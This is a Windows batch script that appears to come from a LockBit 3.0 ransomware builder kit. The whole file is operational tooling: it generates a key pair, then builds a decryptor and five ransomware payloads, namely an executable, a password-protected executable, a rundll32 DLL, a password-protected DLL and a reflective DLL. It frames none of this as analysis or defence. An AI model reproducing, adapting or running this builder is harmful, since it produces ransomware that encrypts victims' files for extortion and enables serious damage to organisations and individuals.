@echo off
echo Press any key to generate the LockBit files (will overwrite existing files)...
pause >nul
IF exist Build (ERASE /F /Q Build\*.*) ELSE (mkdir Build)
echo (1/7) Generating keys
keygen -path Build -pubkey pub.key -privkey priv.key
echo (2/7) Building decryptor
builder -type dec -privkey Build\priv.key -config config.json -ofile Build\LB3Decryptor.exe
echo (3/7) Building ransomware executable
builder -type enc -exe -pubkey Build\pub.key -config config.json -ofile Build\LB3.exe
echo (4/7) Building ransomware executable that requires password
builder -type enc -exe -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_pass.exe
echo (5/7) Building ransomware DLL
builder -type enc -dll -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32.dll
echo (6/7) Building ransomware DLL that requires password
builder -type enc -dll -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32_pass.dll
echo (7/7) Building reflective DLL
builder -type enc -ref -pubkey Build\pub.key -config config.json -ofile Build\LB3_ReflectiveDll_DllMain.dll
echo Done.
pause >nul
